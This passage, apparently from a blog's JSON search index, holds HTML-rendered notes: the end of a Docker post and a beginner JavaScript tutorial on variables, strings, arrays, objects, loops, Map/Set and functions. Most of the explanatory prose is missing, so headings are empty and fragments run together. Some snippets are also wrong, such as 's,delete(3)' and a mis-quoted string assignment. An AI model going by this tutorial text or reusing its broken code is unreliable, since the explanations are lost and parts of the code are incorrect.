&#39;&#39; .()</span><br><span class=\"line\">docker run --name&#x3D;&#39;&#39; -i -d -P  &#x2F;run.sh</span><br><span class=\"line\">docker ps &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>\n<p></p>\n<p><img src=\"/2020/08/07/Docker%E5%AD%A6%E4%B9%A0/image-20201006151417590.png\" alt=\"image-20201006151417590\"></p>\n<p></p>\n<p><img src=\"/2020/08/07/Docker%E5%AD%A6%E4%B9%A0/image-20201006151456458.png\" alt=\"image-20201006151456458\"></p>\n","categories":["Docker"],"tags":["Docker"]},{"title":"Javascript","url":"https://pz1o.top/2020/07/09/javascript/","content":"<a id=\"more\"></a>\n<h1 id=\"Javascript\"><a href=\"#Javascript\" class=\"headerlink\" title=\"Javascript\"></a>Javascript</h1><p><a href=\"https://www.liaoxuefeng.com/wiki/1022910821149312\" target=\"_blank\" rel=\"noopener\">https://www.liaoxuefeng.com/wiki/1022910821149312</a></p>\n<h1 id=\"javascript\"><a href=\"#javascript\" class=\"headerlink\" title=\"javascript\"></a>javascript</h1><h2 id=\"javascript\"><a href=\"#javascript\" class=\"headerlink\" title=\"javascript\"></a>javascript</h2><p><strong></strong></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">\t/...</span><br><span class=\"line\">\t..</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><strong></strong></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"./..\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// </span></span><br><span class=\"line\"><span class=\"keyword\">var</span> num = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"comment\">// </span></span><br><span class=\"line\"><span class=\"keyword\">if</span>()&#123;</span><br><span class=\"line\">..</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">..</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//console.log(num)</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p><strong></strong></p>\n<p><code>$</code><code>_</code></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> $<span class=\"number\">1</span> = <span class=\"string\">\"a\"</span>;</span><br></pre></td></tr></table></figure>\n<p><strong></strong></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">123</span> <span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"number\">123.1</span> <span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"number\">1.1e1</span> <span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"literal\">NaN</span>  <span class=\"comment\">//not a number</span></span><br><span class=\"line\"><span class=\"string\">'abc'</span> <span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"literal\">true</span> <span class=\"comment\">//</span></span><br></pre></td></tr></table></figure>\n<p><strong></strong></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">=</span><br><span class=\"line\">== </span><br><span class=\"line\">===  </span><br></pre></td></tr></table></figure>\n<ol>\n<li>NaN===NaNfalse</li>\n<li>isNaNNaNtrue</li>\n</ol>\n<p><strong></strong></p>\n<blockquote>\n<p></p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> arr = [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"string\">\"hello\"</span>]</span><br></pre></td></tr></table></figure>\n<p><strong></strong></p>\n<blockquote>\n<p>,</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> person = &#123;</span><br><span class=\"line\">\t\tname: <span class=\"string\">\"111\"</span>,</span><br><span class=\"line\">\t\tage: <span class=\"number\">3</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">person.name</span><br><span class=\"line\">&gt;<span class=\"number\">111</span></span><br><span class=\"line\">person.age</span><br><span class=\"line\">&gt;<span class=\"number\">3</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"strict\"><a href=\"#strict\" class=\"headerlink\" title=\"strict\"></a><strong>strict</strong></h3><p>JavaScript<code>var</code><code>i</code><code>i</code></p>\n<p><code>var</code></p>\n<p>JavaScriptECMAstrictstrictJavaScript<code>var</code><code>var</code></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">'use strict'</span>;</span><br><span class=\"line\">abc = <span class=\"string\">\"\"</span>hello world<span class=\"string\">\";</span></span><br><span class=\"line\"><span class=\"string\">//strict</span></span><br><span class=\"line\"><span class=\"string\">var abc = \"</span>hello world<span class=\"string\">\";</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\">\\n</span><br><span class=\"line\">\\t</span><br><span class=\"line\"><span class=\"string\">'\\x41'</span>; <span class=\"comment\">//  'A'</span></span><br><span class=\"line\"><span class=\"string\">'\\u4e2d\\u6587'</span>; <span class=\"comment\">//  ''</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a><strong></strong></h3><p><code>\\n</code>ES6 ``</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a><strong></strong></h3><p>,<code>+</code><code>`${..}</code></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//+</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> name = <span class=\"string\">\"xiao\"</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"number\">123</span>+name);</span><br><span class=\"line\"><span class=\"comment\">//$&#123;&#125;</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> name = <span class=\"string\">\"xiao\"</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">`123<span class=\"subst\">$&#123;name&#125;</span>`</span>)</span><br></pre></td></tr></table></figure>\n<p><strong></strong></p>\n<blockquote>\n<p></p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> s = <span class=\"string\">\"a\"</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(s.length); <span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(s[<span class=\"number\">0</span>]); <span class=\"comment\">//</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>JavaScript<code>Array</code></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> arr = [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>];</span><br><span class=\"line\">arr.length;</span><br><span class=\"line\">arr.length = <span class=\"number\">6</span>; <span class=\"comment\">//length</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>JavaScript</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> xiao=&#123;</span><br><span class=\"line\">\tname: <span class=\"string\">'xiao'</span>,</span><br><span class=\"line\">\tage: <span class=\"number\">18</span>,</span><br><span class=\"line\">\t<span class=\"string\">'school'</span>: <span class=\"string\">'No.1'</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(xiao.name)</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(xiao[<span class=\"string\">'name'</span>])  <span class=\"comment\">//xiaoname</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(xiao[<span class=\"string\">'school'</span>])</span><br></pre></td></tr></table></figure>\n<p>JavaScript.</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> xiao=&#123;</span><br><span class=\"line\">\tname: <span class=\"string\">'xiao'</span>,</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">xiao.age=<span class=\"number\">18</span>;</span><br><span class=\"line\">alert(xiao.age);</span><br><span class=\"line\"><span class=\"keyword\">delete</span> xiao.age</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//hasOwnProperty()</span></span><br><span class=\"line\">xiao.hasOwnProperty(<span class=\"string\">'name'</span>) <span class=\"comment\">//true</span></span><br><span class=\"line\">xiao.hasOwnProperty(<span class=\"string\">'age'</span>) <span class=\"comment\">//false</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;</span><br><span class=\"line\">if(...)&#123;</span><br><span class=\"line\">\t...</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">\t...</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#x2F;&#x2F;</span><br><span class=\"line\">\tif()&#123;</span><br><span class=\"line\">..</span><br><span class=\"line\">&#125;else if()&#123;</span><br><span class=\"line\">..</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>JavaScript<code>null</code><code>undefined</code><code>0</code><code>NaN</code><code>&#39;&#39;</code><code>false</code><code>true</code>.</p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">for(;;)&#123;</span><br><span class=\"line\">\t...;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>for</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> arr = [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>];</span><br><span class=\"line\"><span class=\"keyword\">var</span> i;</span><br><span class=\"line\"><span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">3</span>;i++)&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">console</span>.log(arr[i]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//1  2  3</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"for-in\"><a href=\"#for-in\" class=\"headerlink\" title=\"for in\"></a><strong>for in</strong></h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> o = &#123;</span><br><span class=\"line\">\tname: <span class=\"string\">'bob'</span>,</span><br><span class=\"line\">\tage: <span class=\"number\">18</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> key <span class=\"keyword\">in</span> o)&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">console</span>.log(key);</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(o[key]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//name age</span></span><br><span class=\"line\"><span class=\"comment\">//bob 18</span></span><br><span class=\"line\"><span class=\"comment\">//for...in</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> a = [<span class=\"string\">'A'</span>,<span class=\"string\">'B'</span>,<span class=\"string\">'C'</span>];</span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> i <span class=\"keyword\">in</span> a)&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(a[i]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//A  B  C</span></span><br></pre></td></tr></table></figure>\n<p><strong>while</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">while(...)&#123;</span><br><span class=\"line\">\t...;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>dowhile</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">do&#123;</span><br><span class=\"line\">\t...</span><br><span class=\"line\">&#125;while(...)</span><br></pre></td></tr></table></figure>\n<h2 id=\"MapSet\"><a href=\"#MapSet\" class=\"headerlink\" title=\"MapSet\"></a>MapSet</h2><p>JavaScript<code>{}</code><code>Map</code><code>Dictionary</code></p>\n<p>JavaScript<strong>Number</strong></p>\n<h3 id=\"Map\"><a href=\"#Map\" class=\"headerlink\" title=\"Map\"></a><strong>Map</strong></h3><p><code>Map</code></p>\n<p><code>Map</code><strong></strong><code>Map</code></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//Map</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> m = <span class=\"keyword\">new</span> <span class=\"built_in\">Map</span>();</span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\">m.set(<span class=\"string\">'Bob'</span>,<span class=\"number\">100</span>);</span><br><span class=\"line\">m.set(<span class=\"string\">'Pz1o'</span>,<span class=\"number\">99</span>);</span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\">m.delete(<span class=\"string\">'Bob'</span>);</span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\">m.has(<span class=\"string\">'Pz1o'</span>); <span class=\"comment\">//true</span></span><br><span class=\"line\">m.get(<span class=\"string\">'Pz1o'</span>); <span class=\"comment\">//99</span></span><br></pre></td></tr></table></figure>\n<p>keyvalue</p>\n<hr>\n<h3 id=\"Set\"><a href=\"#Set\" class=\"headerlink\" title=\"Set\"></a>Set</h3><p><code>Set</code><code>Map</code>keyvaluekey<code>Set</code>key</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//set</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> s = <span class=\"keyword\">new</span> <span class=\"built_in\">Set</span>([<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>]);</span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> s = <span class=\"keyword\">new</span> <span class=\"built_in\">Set</span>([<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">3</span>]);</span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\">s.add(<span class=\"number\">4</span>);</span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\">s,<span class=\"keyword\">delete</span>(<span class=\"number\">3</span>);</span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\">s;</span><br></pre></td></tr></table></figure>\n<h2 id=\"iterable\"><a href=\"#iterable\" class=\"headerlink\" title=\"iterable\"></a>iterable</h2><p><code>Array</code><code>Map</code><code>Set</code>ES6<code>iterable</code><code>Array</code><code>Map</code><code>Set</code><code>**iterable</code>**</p>\n<p><strong><code>iterable</code><code>for ... of</code></strong></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> a = [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>];</span><br><span class=\"line\"><span class=\"keyword\">var</span> s = <span class=\"keyword\">new</span> <span class=\"built_in\">Set</span>([<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>]);</span><br><span class=\"line\"><span class=\"keyword\">var</span> m = <span class=\"keyword\">new</span> <span class=\"built_in\">Map</span>([[<span class=\"string\">'A'</span>,<span class=\"string\">'a'</span>],[<span class=\"string\">'Y'</span>,<span class=\"string\">'y'</span>]]);</span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> i <span class=\"keyword\">of</span> a)&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">console</span>.log(i);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//1  2  3</span></span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> i <span class=\"keyword\">of</span> s)&#123;</span><br><span class=\"line\">   <span class=\"built_in\">console</span>.log(i);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//1  2  3</span></span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> i <span class=\"keyword\">of</span> m)&#123;</span><br><span class=\"line\">   <span class=\"built_in\">console</span>.log(i);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//[\"A\",\"a\"]  [\"Y\",\"y\"]</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p><code>for...in</code><code>for...of</code></p>\n<p><code>for...in</code><code>Array</code></p>\n<p><code>for...of</code></p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;forEach</span><br><span class=\"line\">var a &#x3D; [&#39;A&#39;,&#39;B&#39;,&#39;C&#39;];</span><br><span class=\"line\">a.forEach(function(value,index,a)&#123;</span><br><span class=\"line\">\tconsole.log(value+&#39;,&#39;+index);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">&#x2F;&#x2F;A,0  B,1  C,2</span><br><span class=\"line\">forEach(,,)</span><br></pre></td></tr></table></figure>\n<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p><strong></strong></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">abs</span>(<span class=\"params\">...</span>)</span>&#123;</span><br><span class=\"line\">\t...</span><br><span class=\"line\">\t...</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//function </span></span><br><span class=\"line\"><span class=\"comment\">//abs</span></span><br><span class=\"line\"><span class=\"comment\">//(...)</span></span><br><span class=\"line\"><span class=\"comment\">//&#123;...&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> abs = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">..</span>)</span>&#123;</span><br><span class=\"line\">  ...</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"comment\">//function(x)&#123; ... &#125;absabs</span></span><br></pre></td></tr></table></figure>\n<p><code>return</code></p>\n<p><code>return</code><code>undefined</code></p>\n<hr>\n<p><strong></strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">abs(10);</span><br><span class=\"line\">abs(10,111);  &#x2F;&#x2F;10</span><br><span class=\"line\">abs();     &#x2F;&#x2F;NaN</span><br></pre></td></tr></table></figure>\n<p>JavaScript</p>\n<hr>\n<p><strong>arguments</strong></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//arguments()</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"comment\">// length </span></span><br><span class=\"line\">fn(<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>)  <span class=\"comment\">//arguments1 2 3</span></span><br></pre></td></tr></table></figure>\n<p><code>arguments</code>,</p>\n<hr>\n<p><strong>rest</strong></p>\n<p>jsrestrest<code>...</code></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">fn</span>(<span class=\"params\">a,b,...rest</span>)</span>&#123;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(rest);</span><br><span class=\"line\"><span class=\"keyword\">return</span> a+b;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">fn(<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>);  <span class=\"comment\">//[3]</span></span><br><span class=\"line\">fn(<span class=\"number\">1</span>,<span class=\"number\">2</span>)     <span class=\"comment\">//[]</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p></p>\n<p></p>\n<hr>\n<p><strong></strong></p>\n<p>JavaScript<code>window</code><code>window</code></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> a = <span class=\"string\">'A'</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(a);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"built_in\">window</span>.a);</span><br></pre></td></tr></table></figure>\n<p><code>windows</code><code>ReferenceError</code></p>\n<hr>\n<p><strong></strong></p>\n<p><code>window</code>JavaScript<strong></strong></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> Ma = <span class=\"number\">0</span>;</span><br><span class=\"line\">Ma.name = <span class=\"string\">\"xiaoming\"</span>;</span><br><span class=\"line\">Ma.fn = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\"> ....</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p><strong></strong></p>\n<p>ES6<code>let</code><code>let</code><code>var</code></p>\n<p><strong></strong></p>\n<p>ES6<code>const</code><code>const</code><code>let</code></p>\n<p><strong></strong></p>\n<p></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> [x, y, z] = [<span class=\"string\">'hello'</span>, <span class=\"string\">'JavaScript'</span>, <span class=\"string\">'ES6'</span>];</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(x);</span><br></pre></td></tr></table></figure>\n<p></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span 